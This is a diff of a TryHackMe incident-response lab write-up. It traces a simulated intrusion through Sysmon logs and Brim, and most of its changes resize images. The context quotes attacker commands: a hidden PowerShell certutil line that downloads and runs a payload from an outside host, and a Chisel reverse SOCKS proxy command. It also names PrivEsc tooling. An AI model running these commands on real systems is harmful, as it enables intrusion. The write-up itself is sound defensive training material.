@@ -1,4 +1,4 @@
-# One of:TryHackMe:IncidentResponder:TryHackMe:Scenario
+# One of:TryHackMe:IncidentResponder
 
 `Consider It as an Ethical Hacking!`
 
@@ -24,7 +24,7 @@ The NIST Incident Response Framework involves 4 steps:
 
 ## Flowchart
 
-![Flowchart](../../../assets/attachments/cysec/incident/flowchart.jpg){ width=450 height=600 align=center }
+![Flowchart](../../../assets/attachments/cysec/incident/flowchart.jpg){ width=500 height=650 align=center }
 
 **You have served your role as first responder and the blue team, what do you do for react to a incident?**
 
@@ -112,7 +112,7 @@ To analyse the provided packet capture, we will use the following tools:
 
 ### Walk-Through
 
-![Macro](../../../assets/attachments/cysec/incident/pid_taskmanager.jpg){ width=450 height=450 align=center }
+![Macro](../../../assets/attachments/cysec/incident/pid_taskmanager.jpg){ width=500 height=550 align=center }
 
 User expect to open a wordfile.docm.
 The macro, named AutoOpen, executes automatically when the document is opened.
@@ -193,7 +193,7 @@ All the time We would follow below sequential:
 - [x] Finding process and sub processes of Attacker.
 - [x] Finding Events of Attacker.
 
-![Event-win-Sysmon](../../../assets/attachments/cysec/incident/event-win-sysmon-1.jpg){ width=600 height=450 align=center }
+![Event-win-Sysmon](../../../assets/attachments/cysec/incident/event-win-sysmon-1.jpg){ width=700 height=550 align=center }
 
 ```
 C:\Users\user> cd '.\Desktop\Incident Files\'
@@ -208,7 +208,7 @@ Get-FileHash -Algorithm SHA256 .\capture.pcapng
 
 For TimelineExplorer.exe, we can load the exported CSV file by doing the following: File > Open > Choose sysmon.csv from C:\Users\user\Desktop\Incident Files directory
 
-![Msdt](../../../assets/attachments/cysec/incident/sub-process.jpg){ width=450 height=450 align=center }
+![Msdt](../../../assets/attachments/cysec/incident/sub-process.jpg){ width=550 height=550 align=center }
 <p align="center">
   Google: "msdt.exe Windows CVE", you will find CVE code.
 </p>
@@ -221,7 +221,7 @@ Before using this tool, we must export the log file's contents into XML via Even
 
 ## Brim
 
-![Brim](../../../assets/attachments/cysec/incident/brim.jpg){ width=450 height=600 align=center }
+![Brim](../../../assets/attachments/cysec/incident/brim.jpg){ width=550 height=700 align=center }
 
 <p align="center">  
   The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
@@ -231,12 +231,12 @@ Before using this tool, we must export the log file's contents into XML via Even
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
 ```
 
-![Events Log 2](../../../assets/attachments/cysec/incident/brim2.jpg){ width=400 height=600 align=center }
+![Events Log 2](../../../assets/attachments/cysec/incident/brim2.jpg){ width=500 height=700 align=center }
 <p align="center">
  The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
 </p>
 
-![Base64](../../../assets/attachments/cysec/incident/base64.jpg){ width=400 height=600 align=center }
+![Base64](../../../assets/attachments/cysec/incident/base64.jpg){ width=500 height=700 align=center }
 
 Brim Filter:
 
@@ -244,7 +244,7 @@ Brim Filter:
 _path=="http" "resolvecyber.xyz" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
 ```
 
-![Pass](../../../assets/attachments/cysec/incident/pass.jpg){ width=400 height=600 align=center }
+![Pass](../../../assets/attachments/cysec/incident/pass.jpg){ width=500 height=700 align=center }
 
 <p align="center">
   The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
@@ -287,10 +287,10 @@ The attacker then enumerated the list of listening ports inside the machine. Lis
 The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. follow command executed by the attacker to establish the connection:
 
 ```
-"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
+"C:\Users\benimaru\Downloads\ch.exe" client ip:8080 R:socks
 ```
 
-![CH](../../../assets/attachments/cysec/incident/ch.jpg){ width=450 height=450 align=center }
+![CH](../../../assets/attachments/cysec/incident/ch-1.jpg){ width=550 height=550 align=center }
 
 <p align="center">
   The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection
@@ -298,19 +298,19 @@ The attacker then established a reverse socks proxy to access the internal servi
 
 VirusTotal: `Chisel` is the name of the tool used by the attacker based on the SHA256 hash.
 
-![Process](../../../assets/attachments/cysec/incident/process.jpg){ width=450 height=450 align=center }
+![Process](../../../assets/attachments/cysec/incident/process.jpg){ width=550 height=550 align=center }
 
 <p align="center">
 The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
 </p>
 
-![Spf](../../../assets/attachments/cysec/incident/spf.jpg){ width=450 height=450 align=center }
+![Spf](../../../assets/attachments/cysec/incident/spf.jpg){ width=550 height=550 align=center }
 
 <p align="center">  
 After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
 </p>
 
-![PrintSpoofer](../../../assets/attachments/cysec/incident/printspoofer.jpg){ width=450 height=450 align=center }
+![PrintSpoofer](../../../assets/attachments/cysec/incident/printspoofer.jpg){ width=550 height=550 align=center }
 
 <p align="center">  
 Based on the SHA256 hash of the binary, what is the name of the tool used?
@@ -318,7 +318,7 @@ Based on the SHA256 hash of the binary, what is the name of the tool used?
 
 The tool exploits a specific privilege owned by the user. The name of the privilege is `SeImpersonatePrivilege`
 
-![C2](../../../assets/attachments/cysec/incident/c2.jpg){ width=450 height=450 align=center }
+![C2](../../../assets/attachments/cysec/incident/c2.jpg){ width=550 height=550 align=center }
 
 <p align="center">  
 Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
@@ -337,7 +337,7 @@ _path=="http" "" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort
 The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.
 All child events of the new malicious binary used for C2 are worth checking.
 
-![Users](../../../assets/attachments/cysec/incident/users.jpg){ width=450 height=450 align=center }
+![Users](../../../assets/attachments/cysec/incident/users.jpg){ width=550 height=550 align=center }
 
 <p align="center">
 Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
@@ -345,7 +345,7 @@ Upon achieving SYSTEM access, the attacker then created two users. What are the 
 
 Hint: External research needed. Find out what event ID logs successful account creation.
 
-![Events](../../../assets/attachments/cysec/incident/4720.jpg){ width=450 height=450 align=center }
+![Events](../../../assets/attachments/cysec/incident/4720.jpg){ width=550 height=550 align=center }
 
 <p align="center">  
 Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
@@ -353,7 +353,7 @@ Upon achieving SYSTEM access, the attacker then created two users. What are the 
 
 Based on windows event logs, the accounts were successfully created. `4720` is the event ID that indicates the account creation activity.
 
-![Events Log](../../../assets/attachments/cysec/incident/4720.jpg){ width=350 height=600 align=center }
+![Events Log](../../../assets/attachments/cysec/incident/4720.jpg){ width=450 height=650 align=center }
 
 <p align="center">  
 The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
@@ -363,12 +363,12 @@ The attacker added one of the accounts in the local administrator's group. What 
 
 Hint: External research needed. Find out what event ID logs successful addition to a local group.
 
-![Events Log 2](../../../assets/attachments/cysec/incident/4732.jpg){ width=400 height=600 align=center }
+![Events Log 2](../../../assets/attachments/cysec/incident/4732.jpg){ width=500 height=700 align=center }
 
 Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
 </p>
 
-![Final Step](../../../assets/attachments/cysec/incident/final.jpg){ width=500 height=650 align=center }
+![Final Step](../../../assets/attachments/cysec/incident/final.jpg){ width=600 height=700 align=center }
 
 <p align="center">  
 After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
